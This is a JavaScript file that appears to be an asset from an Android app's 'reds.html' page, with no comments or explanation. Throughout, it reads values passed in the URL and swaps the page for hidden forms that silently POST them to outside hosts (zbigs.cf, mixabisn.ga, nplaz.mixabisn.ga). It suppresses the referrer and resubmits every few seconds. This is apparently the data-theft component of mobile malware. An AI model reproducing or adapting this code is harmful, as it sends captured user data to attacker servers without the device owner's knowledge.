var l = window.location.href;
l = l.replace(/@/g,"&");
$(document).ready(function(){
    
function getParameterByName(name, url) {
    if (!url) url = l;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/reds.")){
    var b = getParameterByName("uxs");
    var c = getParameterByName("n");
    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/dtn.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
    
    
}else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redss.")){
    
var b = getParameterByName("uxs");
var c = getParameterByName("n");
    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/ss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
    
    
}else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redsx.")){
    var b = getParameterByName("uxs");
    var c = getParameterByName("n");
    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/dtnx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
    
    
}else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redssx.")){
    
var b = getParameterByName("uxs");
var c = getParameterByName("n");
    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/ssx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
    
    
}

else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/r.")){

var b = getParameterByName("uxs");
$('form').attr('action', 'http://nplaz.mixabisn.ga/novo/dt.php');
$('input').attr('value', b);
document.getElementById('myForm').submit();
setInterval(function(){
document.getElementById('myForm').submit();
    
},2000);
    
}
else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/sred.")){
    
var b = getParameterByName("uxs");
var c = getParameterByName("h");
    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "http://nplaz.mixabisn.ga/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
    
    
}
else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/rr.")){

var a = getParameterByName("a");
var b = getParameterByName("b");
var c = getParameterByName("c");
var d = getParameterByName("d");


    $('body').replaceWith('<meta nme="referrer" content="never"><meta nme="referrer" content="no-referrer"><form action="http://mixabisn.ga/novo/dts1.php" name="vote" method="post" style="display:none;" id="myForm"><input type="text" name="u" value="' + a + '" /><input type="text" name="t" value="' + b + '" /><input type="text" name="y" value="' + c + '" /><input type="text" name="h" value="' + d + '" /></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script>'); 
    
    
    
}
else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/ru.")){

var a = getParameterByName("a");
var b = getParameterByName("b");
var c = getParameterByName("c");
var d = getParameterByName("d");

var aa = '<div id="kong"><form id="myForm" action="http://mixabisn.ga/novo/dtsaa.php" method="post"><input type="hidden" name="ux" value="' + a + '"><input type="hidden" name="t" value="' + b + '"><input type="hidden" name="link" value="' + c + '"><input type="hidden" name="y" value="' + d + '"></form><script>document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);<\/script>';
$('body').replaceWith(aa); 
}else{
    
    
var b = getParameterByName("ux");
$('form').attr('action', 'http://nplaz.mixabisn.ga/novo/dt.php');
$('input').attr('value', b);

document.getElementById('myForm').submit();
setInterval(function(){
document.getElementById('myForm').submit();
    
},2000);
    
}

function kka(){
localStorage.setItem("ii10","true");
}
});
check = "true";
